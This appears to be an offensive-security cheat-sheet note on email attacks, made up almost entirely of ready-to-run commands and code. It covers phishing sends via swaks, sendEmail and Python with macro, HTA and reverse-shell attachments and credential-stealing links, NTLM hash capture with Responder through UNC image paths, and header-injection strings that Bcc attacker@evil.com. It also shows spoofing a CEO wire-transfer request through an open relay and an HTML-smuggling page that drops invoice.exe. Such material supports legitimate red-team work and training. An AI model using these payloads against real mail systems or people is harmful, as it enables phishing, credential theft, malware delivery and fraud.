# Email-Based Attack Techniques

**Tags:** #phishing #email #smtp #initial-access

---

## Send Emails from CLI

```bash
# swaks — Swiss Army Knife for SMTP testing
swaks --to target@corp.com --from helpdesk@corp.com \
  --server mail.corp.com --body "Reset link: http://$LHOST/reset"

# With attachment (phishing)
swaks --to victim@corp.com --from helpdesk@corp.com \
  --server mail.corp.com \
  --attach /tmp/malicious.docm \
  --body "Please review the attached document." \
  --header "Subject: Urgent Action Required"

# With auth (when relay requires creds)
swaks --to victim@corp.com --from attacker@corp.com \
  --server mail.corp.com --port 587 \
  --auth-user attacker@corp.com --auth-password $PASS \
  --tls --body "See attached" --attach payload.hta

# sendEmail tool
sendEmail -f from@corp.com -t to@corp.com -u "Invoice" \
  -m "Please see attached" -a rev.ps1 -s $SMTP_SERVER -v

# Python smtplib
python3 << 'PYEOF'
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

msg = MIMEMultipart()
msg['From'] = 'helpdesk@corp.com'
msg['To'] = 'victim@corp.com'
msg['Subject'] = 'Password Reset Required'
msg.attach(MIMEText('<a href="http://LHOST/steal">Click here</a>', 'html'))

with smtplib.SMTP('SMTP_SERVER', 25) as s:
    s.send_message(msg)
PYEOF
```

## NTLM Hash via Email

```bash
# 1. Responder listening
sudo responder -I tun0 -wv

# 2. Send email with UNC path (captures NTLMv2 when Outlook renders it)
swaks --to victim@corp.com --server mail.corp.com \
  --body '<img src="\\\\$LHOST\\share\\logo.png">'

# 3. Or with HTMLi in body
swaks --to victim@corp.com --server mail.corp.com \
  --body '<a href="file://$LHOST/x">Click here</a>'
```

## Email Injection / Header Injection

```bash
# If web form injects headers without sanitization
# In "To" or "From" field:
victim@corp.com\r\nBcc: attacker@evil.com
victim@corp.com%0ACc:attacker@evil.com

# CRLF injection
"victim@corp.com\r\nSubject: Injected Subject\r\n\r\nInjected body"
```

## Open Relay Abuse

```bash
# Test open relay
nc $TARGET 25
EHLO test.com
MAIL FROM: legitimate@corp.com
RCPT TO: victim@external.com    # If accepted → open relay

# Automated test
nmap -p 25 --script smtp-open-relay $TARGET

# Exploit: spoof email from trusted internal sender
swaks --to victim@corp.com --from ceo@corp.com \
  --server OPEN_RELAY_IP --body "Wire $50k to..."
```

## HTML Smuggling via Email

```bash
# Embed payload that downloads+executes on open
cat > payload.html << 'PAYEOF'
<html><body>
<script>
var data = "<base64_encoded_exe>";
var blob = new Blob([atob(data)], {type: 'application/octet-stream'});
var a = document.createElement('a');
a.href = URL.createObjectURL(blob);
a.download = 'invoice.exe';
a.click();
</script>
</body></html>
PAYEOF

swaks --to victim@corp.com --server mail.corp.com \
  --attach payload.html --body "See attached HTML report"
```

## Related Notes

- [[00-Quick-Reference/SMTP - POP3 - IMAP]] — Mail protocol enumeration
- [[00-Quick-Reference/NTLM Theft]] — Capture hashes via email
